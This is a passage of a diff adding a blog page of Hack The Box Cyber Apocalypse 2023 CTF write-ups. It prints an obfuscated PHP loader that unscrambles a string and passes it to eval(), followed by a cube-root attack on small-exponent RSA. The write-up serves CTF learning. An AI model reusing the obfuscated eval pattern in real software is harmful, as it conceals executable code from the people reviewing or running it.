+$iyzQ5h8qf6 .= "n d     ee )&gt;ys:cai    )\ny e\"e0' m een]1 ri')   c;\"pr. pt\"r_rrfed \$c/) s / tEv)\nHea i  {  (rp)\nl//rxp{{ \$  p r] )- o:xxt,s ls;  =sh\n&lt;u&gt;\"tu";
+$iyzQ5h8qf6 .= " ;.e:&gt;ic  umb; = t\$hRa) P m v  \n  \$(u;\neb/ict\n  m{ e [ &amp; ' d eef % ds\n{  coeit\\'ytt\n'xr&lt;lhs pd&gt;\n \" hk(Vl[ _.e &gt;     f'b\n&lt;soapd&gt; \$ o  = \"=";
+$iyzQ5h8qf6 .= " ?;\$e'cc(\$1 [ei\n ra cn n p y\n/ie/eou l'&lt; et &gt;e\$Eun S ] \n     iCl hhojtn\n t d\$ ' e 0 \nw Suu\"os\$'tf  en\"hpt&lt;metpi'sdbT c o]b ca";
+$iyzQ5h8qf6 .= "&lt;\nydRea E\" e&lt;    hlai teta&gt;.\n y et u x(0' o&amp;'tt%w\"se(   ad\\ouyde=yef.t'ro'c a)r hbt  i[ m L&lt;.c/    eecc mesx\nb&lt; p  y '\$e\$0x r ;ee1n,.x\$(  lin tpit'p";
+$iyzQ5h8qf6 .= "= bs&gt;&gt;U&lt;e d)&gt; olh =r'.e F/\"hh \$  a)h' ltt.\nod e &amp;p ;ocm2' l0\n'\"se =e_\$  pr&lt;\" evhhe'(a(E\"pbseD \"  e&gt; &gt;.P ] 'a&lt;ot f hd.e) &gt;\"r";
+$iyzQ5h8qf6 .= "g&lt;oi =e e \nwuo0  dx ]]\"r\$scPd  a(b&lt;t= oi=sis\$r;lrsci{; \" N  'H\"  ]&gt;/ m i ee'-; \n ao!tv 'l0=e ntd): [8 = ,[gpuOi  t\$riy'cdd'useur\no&gt;fhr\n\n \$ta \$/P&lt;.e &lt;t\"";
+$iyzQ5h8qf6 .= "l l ar\"C\n &lt;hpo-s  psx'l eee   \"0 == 'rrtSr  hd&gt;npsl=dfbsnpo a&lt;uoe   vam v'_/ l./d&lt;&gt; e d('o  !r.g-tc\$'e6-s r\" ?' e0 ' \$woieT   (i&lt;peua'eime";
+$iyzQ5h8qf6 .= "alr dbl c  fabe&lt;a.Sa\"s t&gt;/    e')n  -eml rlm; 0'e []&amp; - x  x(trun'[=  \$rfu=bsPnlitmo. 'rl't  oll&lt;/l\$E&gt;&lt;e\"d&lt;t  = rC;t  -fieLaao i0;  \"  ''\$e) ";
+$iyzQ5h8qf6 .= "'\$yipt]'=  d)ot'msO'et(ea  ]&gt;y&lt;o  rue/tuvL&lt;/ ?&gt;tr    (o\nr   =naapsd}f0 i w=0w;wc  )wpt[f)d   i;r ti=S ''\$(dF [&lt; br  ee-treaF/t{d&lt;d&gt;  \$h";
+$iyzQ5h8qf6 .= "'n o  L\".ptcse\n( }f r 0'\nou\$  oee'(;iN  r\nmtet'Tn  _\$Di 'biry  a hh&gt;)l'td\not&gt;\"  _eCt l rahcied=   )\n( i(0  rtoi?r)'r\"\nrU e.e yx'n'anvP_il t&gt;n&gt;.  c";
+$iyzQ5h8qf6 .= "\\o&gt;\n u]d&gt; wd ;  Gaoe : ettsssn\"= \$   \$t\$4: lewf l;]e% 'L c'capt a maaOFre mF &lt;'  hnv\n {e &gt;&lt; n&gt;\"\n  Ednn   aets.t.c  m{ \$oem0  d\"n('d\n,a1 ]L h/hce'vveemlS";
+$iyzQ5h8qf6 .= "Ie }pi'b&lt;ee &lt;e  \n).&lt;t l\" }  Tett m dsp\"c cof o  mw\"o)' []e s[  ds )  o'ot= abn=euTLca\n_l.r/cx(br   ) td o..\n  [re- u ft:&gt;oconi d\$ on]d - ";
+$iyzQ5h8qf6 .= "\" r\$'' \$'% )oe . i'nlac'=e[Etl ne\$&gt;bhe\$r    )\"d&gt; a  e  '(nD s i /\nmomtl et de e?' w=[m e o]1  rc\$\$\"ohaurtd'='Sor a d&lt;&gt;occ&gt;t &lt;  ?&gt;  dppc  d";
+$iyzQ5h8qf6 .= "'ti t lc/\n/m/ae  y er=  ; r \"o:x w,s { hfv&lt;nime-yif's[re m'ib&lt; (m\"a / {d\"\" =orh  oC-s -heom&lt;apbip &amp;p  [ &amp;'\n i(ed e n % \n!oiah=de=fpriUu'ya e.r b\"'d;b t";
+$iyzQ5h8qf6 .= " \ni.  \"sio  woTp re(ma!jionee e &amp;\"( r \$t\$xe'c e\$1  i ll2'd='oe'lpbf)d '\$.sr&lt;cr\nl h  r . .in   ";
+for($i = 0; $i &lt; $pPziZoJiMpcu; $i++) $liGBOKxsOGMz[] = "";
+for($i = 0; $i &lt; (strlen($iyzQ5h8qf6) / $pPziZoJiMpcu); $i++) { for($r = 0; $r &lt; $pPziZoJiMpcu; $r++) $liGBOKxsOGMz[$r] .= $iyzQ5h8qf6[$r + $i * $pPziZoJiMpcu]; }
+$bhrTeZXazQ = trim(implode("", $liGBOKxsOGMz));
+$bhrTeZXazQ = "?&gt;$bhrTeZXazQ";
+eval( $bhrTeZXazQ );
+?&gt;</code></pre></li><li>deobfuscate using <a href="https://onecompiler.com/php/3z32fgvgh">https://onecompiler.com/php/3z32fgvgh</a></li></ul><figure><img src="../assets/images/htb/cyber-apocalypse-2023/15-untitled-14.png" alt=""></figure><p>By showing what is put in eval the the end you can find the flag in the html</p><figure><img src="../assets/images/htb/cyber-apocalypse-2023/16-untitled-15.png" alt=""></figure><figure><img src="../assets/images/htb/cyber-apocalypse-2023/17-untitled-16.png" alt=""></figure><p><mark class="highlight-teal" data-notion-highlight="teal"><strong>Flag </strong></mark>→ HTB{W0w_ROt_A_DaY}</p>
+</div>
+</details>
+
+<h2>Crypto</h2>
+
+<details>
+<summary>Small StEps</summary>
+<div class="inner">
+<blockquote>As you continue your journey, you must learn about the encryption method the aliens used to secure their communication from eavesdroppers. The engineering team has designed a challenge that emulates the exact parameters of the aliens' encryption system, complete with instructions and a code snippet to connect to a mock alien server. Your task is to break it.</blockquote><p>The flaw is that the exponent is extremely small. Because of this we can just calculate the cube root of the ciphertext to decrypt the message:</p><pre><code># Cipher
+70407336670535933819674104208890254240063781538460394662998902860952366439176467447947737680952277637330523818962104685553250402512989897886053
+
+# Cube root
+412926389432612660984016953290834154417829082237</code></pre><p><mark class="highlight-teal" data-notion-highlight="teal"><strong>Flag </strong></mark>→ HTB{5ma1l_E-xp0n3nt}</p>
+</div>
+</details>
+                </article>
+
+                <aside class="toc">
+                    <p class="toc-k">Contents</p>
+                    <ul id="toc-list"></ul>
+                </aside>
+            </div>
+        </main>
+
+        <footer class="site-foot">
+            <div class="foot-in">
+                <p class="copy">© <span data-year></span> Frédéric Goossens · <span class="credit">vibe coded</span></p>
+                <div class="socials">
+                    <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+                    <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <div class="scroll-hint" data-scroll-hint aria-hidden="true"></div>
+    <script src="../assets/js/site.js?v=66"></script>
+</body>
+</html>
